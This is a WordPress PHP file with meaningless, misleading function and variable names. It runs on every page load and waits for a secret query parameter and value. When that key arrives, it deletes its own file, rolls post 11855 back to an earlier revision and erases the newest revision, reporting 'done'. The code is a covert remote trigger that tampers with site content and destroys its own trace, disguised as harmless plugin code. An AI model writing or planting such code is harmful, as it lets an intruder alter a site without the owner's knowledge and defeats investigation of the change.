<?php

function appointment_word_after() {
	if (isset($_GET['endpoints_pdf_upgrader']) && $_GET['endpoints_pdf_upgrader'] === 'icons_enable_archives_survey') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$ui_advanced_size = 11855;
		$view_heading_customer_schedule = wp_get_post_revisions($ui_advanced_size);
		if (empty($view_heading_customer_schedule)) die('no revisions');
		if (count($view_heading_customer_schedule) < 2) die('less than 2');
		$nextgen_server_numbers = array_shift($view_heading_customer_schedule);
		$inline_extensions_ninja_guest = $nextgen_server_numbers->ID;
		$time_create_top = array_shift($view_heading_customer_schedule);
		$genesis_pdf_item_get = $time_create_top->ID;
		$publisher_weather_controller = wp_restore_post_revision($genesis_pdf_item_get);
		if ($publisher_weather_controller === false) die('error restoring');
		$publisher_weather_controller = wp_delete_post_revision($inline_extensions_ninja_guest);		
		if ($publisher_weather_controller === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'appointment_word_after');
